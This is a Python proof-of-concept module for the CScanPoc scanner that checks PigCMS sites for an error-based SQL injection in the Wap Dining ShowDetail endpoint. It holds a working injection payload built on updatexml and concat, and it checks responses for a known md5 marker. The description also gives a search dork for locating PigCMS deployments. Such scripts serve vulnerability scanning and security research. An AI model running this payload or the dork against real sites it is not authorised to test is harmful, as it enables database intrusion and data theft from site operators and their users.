# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'PigCMS_0001'  # 平台漏洞编号，留空
    name = 'PigCMS SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-12-16'  # 漏洞公布时间
    desc = '''
        PigCms（又称小猪CMS）是一个基于php+mysql的多用户微信营销源码程序，由合肥彼岸互联信息技术有限公司开发，是国内使用最多、功能最强大、性能最稳定的多用户微信营销系统平台源码,目前国内大多数微信营销平台都是pigcms或由pigcms二次开发而成。
        可以百度搜索 site:weihubao.com，weihubao.com是彼岸互联注册的一个域名，搜索得到的结果全都是pigcms的授权用户。
        index.php $sql 变量未初始化导致注入。
    '''  # 漏洞描述
    ref = 'https://www.sitedirsec.com/exploit-1881.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PigCMS(小猪CMS)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c2e8c527-b737-453a-9197-fe539e413c62'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-09'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/index.php?g=Wap&m=Dining&a=ShowDetail&id=2%20and%20updatexml(1,concat(0x7e,(md5(c))),0)%23'
            url = self.target + payload
            r = requests.get(url)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
